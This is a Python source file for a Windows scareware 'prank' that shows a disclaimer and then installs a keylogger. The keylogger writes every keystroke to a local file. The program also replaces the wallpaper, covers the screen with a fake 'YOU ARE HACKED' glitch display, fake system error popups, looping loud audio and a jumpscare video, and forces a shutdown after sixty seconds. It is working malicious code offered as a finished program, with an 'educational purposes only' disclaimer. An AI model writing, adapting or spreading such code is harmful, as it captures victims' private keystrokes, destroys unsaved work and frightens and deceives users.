import tkinter as tk
from tkinter import messagebox
import random
import threading
import time
import pygame
from pynput import keyboard
import subprocess
import os
from PIL import Image, ImageTk
import shutil
import winreg
import ctypes

# === Keylogger ===
def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"[{key}]")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def play_sound():
    pygame.init()
    pygame.mixer.init()
    try:
        pygame.mixer.music.load("music.mp3")
        pygame.mixer.music.play(-1)
        while True:
            time.sleep(1)
    except Exception as e:
        print("Sound error:", e)

def show_windows_warning():
    root = tk.Tk()
    root.withdraw()

    message = (
        """!!! WARNING !!!

The creator of this program is NOT responsible for any damage, data loss, or consequences caused by running this software.

By continuing to run this program, YOU ACCEPT all risks involved.

This program has LOUD SOUNDS and may cause your computer to become unresponsive.

Please ensure you have saved all important work before proceeding.

If you have epilepsy or are sensitive to flashing lights, DO NOT RUN THIS PROGRAM.

Please consider to close all other applications before running this program.

This program can break your speaker, headphones, or other audio devices.

If you are not comfortable with these risks, please close this program now.

THIS SOFTWARE IS FOR EDUCATIONAL PURPOSES ONLY
    """)

    proceed = messagebox.askokcancel("Warning", message)
    root.destroy()
    return proceed

def set_wallpaper(image_path):
    abs_path = os.path.abspath(image_path)
    result = ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
    if result:
        print(f"Wallpaper uspešno postavljen: {abs_path}")
    else:
        print("Neuspešno postavljanje wallpapera.")

def glitch_fullscreen():
    charset = "01@#$%&*ABCDEFG"
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.config(cursor="none")

    # Custom kursor
    try:
        cursor_img = Image.open("cursor.png")
        cursor_photo = ImageTk.PhotoImage(cursor_img)
        cursor_label = tk.Label(root, image=cursor_photo, bg="black", bd=0)
        cursor_label.image = cursor_photo
        cursor_label.place(x=0, y=0)

        def follow_mouse(event):
            cursor_label.place(x=event.x, y=event.y)

        root.bind('<Motion>', follow_mouse)
    except Exception as e:
        print(f"Greška sa učitavanjem kursora: {e}")

    glitch_text = tk.Label(root, font=("Courier", 20), fg="lime", bg="black", justify="left")
    glitch_text.place(x=0, y=0, relwidth=1, relheight=1)

    dvd_label = tk.Label(root, text="YOU ARE HACKED BY THE SCULL SECRET OPERATION",
                         font=("Arial Black", 24, "bold"), fg="red", bg="black")
    dvd_label.place(x=100, y=100)

    def update_text():
        while True:
            lines = "\n".join(
                "".join(random.choice(charset) for _ in range(120))
                for _ in range(40)
            )
            glitch_text.config(text=lines)
            time.sleep(0.05)

    threading.Thread(target=update_text, daemon=True).start()

    def move_dvd():
        x, y = 100, 100
        dx, dy = 5, 3

        width = root.winfo_screenwidth()
        height = root.winfo_screenheight()

        root.update_idletasks()
        label_width = dvd_label.winfo_width()
        label_height = dvd_label.winfo_height()

        while True:
            x += dx
            y += dy

            if x + label_width >= width or x <= 0:
                dx = -dx
            if y + label_height >= height or y <= 0:
                dy = -dy

            dvd_label.place(x=x, y=y)
            time.sleep(0.02)

    threading.Thread(target=move_dvd, daemon=True).start()
    threading.Thread(target=show_fake_errors, daemon=True).start()
    threading.Thread(target=play_jumpscare_video, daemon=True).start()

    root.mainloop()

def show_fake_errors():
    fake_errors = [
        "Application error: 0xc0000142",
        "Memory access violation at 0x00007FF...",
        "Windows has encountered a critical error.",
        "Unexpected exception in system32.dll",
        "Fatal error: SYSTEM_SERVICE_EXCEPTION",
        "Disk read error occurred.",
        "Driver_irql_not_less_or_equal",
        "Application failed to start correctly.",
        "Runtime Error! Program C:\\Windows\\System32\\svchost.exe",
        "The instruction at 0x00000000 referenced memory at 0xFFFFFFFF."
    ]

    while True:
        time.sleep(random.randint(5, 15))
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("Error", random.choice(fake_errors))
        root.destroy()

def play_jumpscare_video():
    while True:
        time.sleep(random.randint(5, 15))
        video_path = os.path.abspath("jumpscare.mp4")
        subprocess.Popen(f'start wmplayer "{video_path}"', shell=True)

def auto_shutdown_after_delay(seconds):
    def shutdown():
        time.sleep(seconds)
        os.system("shutdown /s /t 0")  # Odmah gasi računar
    threading.Thread(target=shutdown, daemon=True).start()

# === MAIN ===
if __name__ == "__main__":
    if show_windows_warning():
        set_wallpaper("wallpaper.jpg")
        start_keylogger()
        threading.Thread(target=play_sound, daemon=True).start()
        auto_shutdown_after_delay(60)
        glitch_fullscreen()
    else:
        print("User canceled. Exiting program.")
